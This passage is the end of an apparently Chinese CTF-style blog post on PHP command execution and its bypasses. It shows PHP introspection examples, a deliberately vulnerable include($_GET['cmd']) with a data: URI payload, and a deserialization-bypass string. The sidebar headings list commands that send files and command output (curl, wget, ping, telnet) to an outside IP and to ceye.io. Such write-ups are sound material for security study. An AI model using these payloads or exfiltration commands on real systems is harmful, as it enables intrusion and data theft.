<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">echo &apos;&lt;pre&gt;&apos;;  </span><br><span class="line">$vars = get_defined_vars();</span><br><span class="line">$b = array(1,1,2,3,5,8);  </span><br><span class="line">  </span><br><span class="line">$arr = get_defined_vars();  </span><br><span class="line">  </span><br><span class="line">// 打印 $b  </span><br><span class="line">//print_r($arr[&quot;b&quot;]);  </span><br><span class="line">  </span><br><span class="line">// 打印所有服务器变量  </span><br><span class="line">//print_r($arr[&quot;_SERVER&quot;]);  </span><br><span class="line">  </span><br><span class="line">// 打印变量数组的所有可用键值  </span><br><span class="line">print_r(get_defined_vars());  </span><br><span class="line">print_r(array_keys(get_defined_vars()));  </span><br><span class="line">$vars = array_diff(get_defined_vars(),$vars);</span><br><span class="line">print_r($vars);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="get-loaded-extensions"><a href="#get-loaded-extensions" class="headerlink" title="get_loaded_extensions()"></a><code>get_loaded_extensions()</code></h3><p><code>get_loaded_extensions</code> — 返回所有编译并加载模块名的 array</p>
<p><code>get_loaded_extensions ([ bool $zend_extensions = false ] ) : array</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(get_loaded_extensions());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="get-extension-funcs"><a href="#get-extension-funcs" class="headerlink" title="get_extension_funcs()"></a><code>get_extension_funcs()</code></h3><p><code>get_extension_funcs</code> — 返回模块函数名称的数组</p>
<p><code>get_extension_funcs ( string $module_name ) : array</code></p>
<p>该函数根据 module_name 返回模块内定义的所有函数的名称。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(get_extension_funcs(&quot;curl&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="get-defined-constants"><a href="#get-defined-constants" class="headerlink" title="get_defined_constants()"></a><code>get_defined_constants()</code></h3><p><code>get_defined_constants</code> — 返回所有常量的关联数组，键是常量名，值是常量值</p>
<p><code>get_defined_constants ([ bool $categorize = false ] ) : array</code></p>
<p>返回当前所有已定义的常量名和值。 这包含 define() 函数所创建的，也包含了所有扩展所创建的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(get_defined_constants());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="get-declared-classes"><a href="#get-declared-classes" class="headerlink" title="get_declared_classes()"></a><code>get_declared_classes()</code></h3><p><code>get_declared_classes</code> — 返回由已定义类的名字所组成的数组</p>
<p><code>get_declared_classes ( void ) : array</code></p>
<p>返回由当前脚本中已定义类的名字组成的数组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(get_declared_classes());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="八、杂"><a href="#八、杂" class="headerlink" title="八、杂"></a>八、杂</h2><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>PHP文件包含会执行包含文件的代码，当开启了远程文件包含，则非常容易引起代码注入攻击。远程文件包含条件: <code>allow_url_fopen=On</code>, <code>allow_url_include=On</code>, 文件包含相关函数有: <code>include, include_once, require, require_once</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&apos;cmd&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><code>cmd=data:text/plain,%3C?php%20phpinfo%28%29;?%3E</code>, 即执行phpinfo()。</p>
<h3 id="反序列化验证绕过"><a href="#反序列化验证绕过" class="headerlink" title="反序列化验证绕过"></a>反序列化验证绕过</h3><p><code>O:+4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;}</code></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.beesfun.com/2017/04/18/PHP%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%92%8C%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">PHP代码注入和命令注入</a></p>
<p><a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">php代码-命令执行漏洞</a></p>
<p><a href="http://www.cszhi.com/20111212/php_exec_system_shell_exec_passthru.html" target="_blank" rel="noopener">PHP执行系统外部命令函数:exec()、passthru()、system()、shell_exec()</a></p>
<p><a href="https://www.anquanke.com/post/id/162128" target="_blank" rel="noopener">命令执行与代码执行的小结</a></p>
<p><a href="https://pplsec.github.io/2019/01/17/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">PHP命令执行&amp;代码执行</a></p>
<p><a href="https://hl0rey.github.io/2018/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">代码审计之代码执行</a></p>
<a href="https://lorexxar.cn/2015/12/21/dmsj-book/" target="_blank" rel="noopener">
《代码审计》一点儿笔记</a>


<p><a href="http://www.cnblogs.com/LittleHann/p/3522990.html" target="_blank" rel="noopener">Deformity PHP Webshell、Webshell Hidden Learning</a></p>
<p><a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell" target="_blank" rel="noopener">Bypass_Disable_functions_Shell</a></p>
<p><a href="http://www.icyfire.me/2014/06/27/php-program-execution.html" target="_blank" rel="noopener">PHP函数篇之执行外部程序</a></p>
<p><a href="https://www.anquanke.com/post/id/168093" target="_blank" rel="noopener">PHP-escapeshell-命令执行</a></p>
<p><a href="http://sunu11.com/2019/01/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93%E4%B8%8Etips/" target="_blank" rel="noopener">命令执行总结与tips</a></p>
<p><a href="https://www.freebuf.com/articles/web/88354.html" target="_blank" rel="noopener">技术分析：攻击者是如何利用系统命令盲注实现“拖库”的？</a></p>
<p><a href="http://www.tharavel.site/2018/03/23/command-execute.html" target="_blank" rel="noopener">各种命令执行总结</a></p>

      
    </div>
    
    
    
    <div>
      
        
<div class="my_post_copyright">
  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
  
  <!-- JS库 sweetalert 可修改路径 -->
  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
  <p><span>本文标题:</span><a href="/2019/05/15/命令&执行&绕过/">PHP命令&执行&绕过</a></p>
  <p><span>文章作者:</span><a href="/" title="访问 MuseLJH 的个人博客">MuseLJH</a></p>
  <p><span>发布时间:</span>2019年05月15日 - 17:41</p>
  <p><span>最后更新:</span>2019年05月30日 - 21:32</p>
  <p><span>原始链接:</span><a href="/2019/05/15/命令&执行&绕过/" title="PHP命令&执行&绕过">https://museljh.github.io/2019/05/15/命令&执行&绕过/</a>
    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://museljh.github.io/2019/05/15/命令&执行&绕过/" aria-label="复制成功！"></i></span>
  </p>
  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
</div>
<script> 
    var clipboard = new Clipboard('.fa-clipboard');
      $(".fa-clipboard").click(function(){
      clipboard.on('success', function(){
        swal({   
          title: "",   
          text: '复制成功',
          icon: "success", 
          showConfirmButton: true
          });
        });
    });  
</script>


      
    </div>
    <div>
     
        <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------END-------------</div>
    
</div>

      
    </div>
    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/命令执行/" rel="tag"><i class="fa fa-tag"></i> 命令执行</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/04/24/xss小结/" rel="next" title="xss小结">
                <i class="fa fa-chevron-left"></i> xss小结
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/05/15/PHP代码加密原理探索/" rel="prev" title="PHP代码加密原理探索">
                PHP代码加密原理探索 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/LJH.jpg" alt="MuseLJH">
            
              <p class="site-author-name" itemprop="name">MuseLJH</p>
              <p class="site-description motion-element" itemprop="description">ROIS端茶web手</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">31</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">22</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/MuseLJH" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:1049135835@qq.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://twitter.com/MuseLJHX" target="_blank" title="Twitter">
                      
                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、命令执行-写shell"><span class="nav-number">1.</span> <span class="nav-text">一、命令执行/写shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eval"><span class="nav-number">1.1.</span> <span class="nav-text">eval</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fputs"><span class="nav-number">1.2.</span> <span class="nav-text">fputs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#preg-replace"><span class="nav-number">1.3.</span> <span class="nav-text">preg_replace ====</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#assert"><span class="nav-number">1.4.</span> <span class="nav-text">assert() ====</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call-user-func"><span class="nav-number">1.5.</span> <span class="nav-text">call_user_func()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#call-user-func-array"><span class="nav-number">1.6.</span> <span class="nav-text">call_user_func_array()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#create-function"><span class="nav-number">1.7.</span> <span class="nav-text">create_function  ====</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#array-filter"><span class="nav-number">1.8.</span> <span class="nav-text">array_filter()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#usort-uasort-uksort"><span class="nav-number">1.9.</span> <span class="nav-text">usort()/uasort()/uksort()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ob-start"><span class="nav-number">1.10.</span> <span class="nav-text">ob_start</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#可变函数-var-args"><span class="nav-number">1.11.</span> <span class="nav-text">可变函数$var(args)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#"><span class="nav-number">1.12.</span> <span class="nav-text">\$</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#array-map"><span class="nav-number">1.13.</span> <span class="nav-text">array_map ====</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#、array-walk-array-walk-recursive-register-shutdown-function-preg-replace-callback-array-reduce"><span class="nav-number">1.14.</span> <span class="nav-text">、array_walk/array_walk_recursive/register_shutdown_function/preg_replace_callback/array_reduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stream-filter-register"><span class="nav-number">1.15.</span> <span class="nav-text">stream_filter_register</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#array-uintersect-uassoc"><span class="nav-number">1.16.</span> <span class="nav-text">array_uintersect_uassoc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xml-set-character-data-handler-xml-set-default-handler-xml-set-element-handler-xml-set-end-namespace-decl-handler-xml-set-external-entity-ref-handler-xml-set-notation-decl-handler-xml-set-processing-instruction-handler-xml-set-start-namespace-decl-handler-xml-set-unparsed-entity-decl-handler"><span class="nav-number">1.17.</span> <span class="nav-text">xml_set_character_data_handler()/xml_set_default_handler()/xml_set_element_handler()/xml_set_end_namespace_decl_handler()/xml_set_external_entity_ref_handler()/xml_set_notation_decl_handler()/xml_set_processing_instruction_handler()/xml_set_start_namespace_decl_handler()/xml_set_unparsed_entity_decl_handler()/</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#集合"><span class="nav-number">1.18.</span> <span class="nav-text">集合</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、PHP执行系统外部命令函数"><span class="nav-number">2.</span> <span class="nav-text">二、PHP执行系统外部命令函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#system"><span class="nav-number">2.1.</span> <span class="nav-text">system()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#passthru"><span class="nav-number">2.2.</span> <span class="nav-text">passthru()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exec"><span class="nav-number">2.3.</span> <span class="nav-text">exec()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shell-exec"><span class="nav-number">2.4.</span> <span class="nav-text">shell_exec()/``</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pcntl-exec"><span class="nav-number">2.5.</span> <span class="nav-text">pcntl_exec()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#popen"><span class="nav-number">2.6.</span> <span class="nav-text">popen()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#proc-open"><span class="nav-number">2.7.</span> <span class="nav-text">proc_open()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#escapeshellcmd-escapeshellarg-（属于命令执行绕过范畴）"><span class="nav-number">2.8.</span> <span class="nav-text">escapeshellcmd()/escapeshellarg()（属于命令执行绕过范畴）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#集合-1"><span class="nav-number">2.9.</span> <span class="nav-text">集合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows下文件读取"><span class="nav-number">2.10.</span> <span class="nav-text">windows下文件读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux下文件读取"><span class="nav-number">2.11.</span> <span class="nav-text">linux下文件读取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows-写文件"><span class="nav-number">2.12.</span> <span class="nav-text">windows 写文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-写文件"><span class="nav-number">2.13.</span> <span class="nav-text">linux 写文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、命令执行绕过"><span class="nav-number">3.</span> <span class="nav-text">三、命令执行绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#命令分隔符"><span class="nav-number">3.1.</span> <span class="nav-text">命令分隔符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-1"><span class="nav-number">3.2.</span> <span class="nav-text">${}</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#空格绕过"><span class="nav-number">3.3.</span> <span class="nav-text">空格绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过"><span class="nav-number">3.4.</span> <span class="nav-text">/绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#加号-大于号绕过"><span class="nav-number">3.5.</span> <span class="nav-text">加号/大于号绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#黑名单绕过"><span class="nav-number">3.6.</span> <span class="nav-text">黑名单绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-通配符利用"><span class="nav-number">3.6.1.</span> <span class="nav-text">1.通配符利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#夹杂字符"><span class="nav-number">3.6.2.</span> <span class="nav-text">夹杂字符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#编码绕过"><span class="nav-number">3.6.3.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#字符串拼接"><span class="nav-number">3.6.4.</span> <span class="nav-text">字符串拼接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#多条命令执行"><span class="nav-number">3.6.5.</span> <span class="nav-text">多条命令执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ip中-绕过"><span class="nav-number">3.6.6.</span> <span class="nav-text">ip中.绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#巧借全局变量"><span class="nav-number">3.6.7.</span> <span class="nav-text">巧借全局变量</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四、无回显命令执行"><span class="nav-number">4.</span> <span class="nav-text">四、无回显命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹shell"><span class="nav-number">4.1.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#curl-T-museljh-txt-http-120-77-176-168-11122"><span class="nav-number">4.2.</span> <span class="nav-text">curl -T museljh.txt http://120.77.176.168:11122</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#curl-quot-http-120-77-176-168-11122-quot-data-binary-quot-museljh-txt-quot"><span class="nav-number">4.3.</span> <span class="nav-text">curl &quot;http://120.77.176.168:11122&quot; --data-binary &quot;@museljh.txt&quot;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ping-whoami-ceye-io"><span class="nav-number">4.4.</span> <span class="nav-text">ping `whoami`.**.ceye.io</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#curl-http-8itzz8-ceye-io-whoami"><span class="nav-number">4.5.</span> <span class="nav-text">curl http://8itzz8.ceye.io/`whoami`</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nc-l-p-11122-lt-museljh-txt，curl-http-120-x-176-x-11122"><span class="nav-number">4.6.</span> <span class="nav-text">nc -l -p 11122 &lt;  museljh.txt，curl http://120.x.176.x:11122</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wget-header-quot-museljh-cat-flag-txt-quot-http-120-77-176-168-11122"><span class="nav-number">4.7.</span> <span class="nav-text">wget --header=&quot;museljh:cat flag.txt&quot; http://120.77.176.168:11122</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cat-flag-txt-xxd-p-c-16-while-read-exfil-do-ping-p-exfil-c-1-127-0-0-1-done"><span class="nav-number">4.8.</span> <span class="nav-text">cat flag.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 127.0.0.1; done</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#net-use-h-xxx-xxx-xxx-xxx-web-user-username-museljh-amp-amp-copy-File-to-Copy-h-filename-txt"><span class="nav-number">4.9.</span> <span class="nav-text">net use h: \\xxx.xxx.xxx.xxx\web /user:{username} {museljh} &amp;&amp; copy {File to Copy} h:\{filename}.txt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#telnet-xxx-xxx-xxx-xxx-port-lt-file-to-transfer"><span class="nav-number">4.10.</span> <span class="nav-text">telnet xxx.xxx.xxx.xxx {port} &lt; {file to transfer}</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五、畸变的webshell"><span class="nav-number">5.</span> <span class="nav-text">五、畸变的webshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六、PHP文件读取函数"><span class="nav-number">6.</span> <span class="nav-text">六、PHP文件读取函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#集合-2"><span class="nav-number">6.1.</span> <span class="nav-text">集合</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#七、PHP输出当前进程所有变量-常量-模块-函数-类"><span class="nav-number">7.</span> <span class="nav-text">七、PHP输出当前进程所有变量 / 常量 / 模块 / 函数 / 类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#get-defined-functions"><span class="nav-number">7.1.</span> <span class="nav-text">get_defined_functions()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-defined-vars"><span class="nav-number">7.2.</span> <span class="nav-text">get_defined_vars()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-loaded-extensions"><span class="nav-number">7.3.</span> <span class="nav-text">get_loaded_extensions()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-extension-funcs"><span class="nav-number">7.4.</span> <span class="nav-text">get_extension_funcs()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-defined-constants"><span class="nav-number">7.5.</span> <span class="nav-text">get_defined_constants()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-declared-classes"><span class="nav-number">7.6.</span> <span class="nav-text">get_declared_classes()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#八、杂"><span class="nav-number">8.</span> <span class="nav-text">八、杂</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#远程文件包含"><span class="nav-number">8.1.</span> <span class="nav-text">远程文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反序列化验证绕过"><span class="nav-number">8.2.</span> <span class="nav-text">反序列化验证绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">9.</span> <span class="nav-text">参考</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        
        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
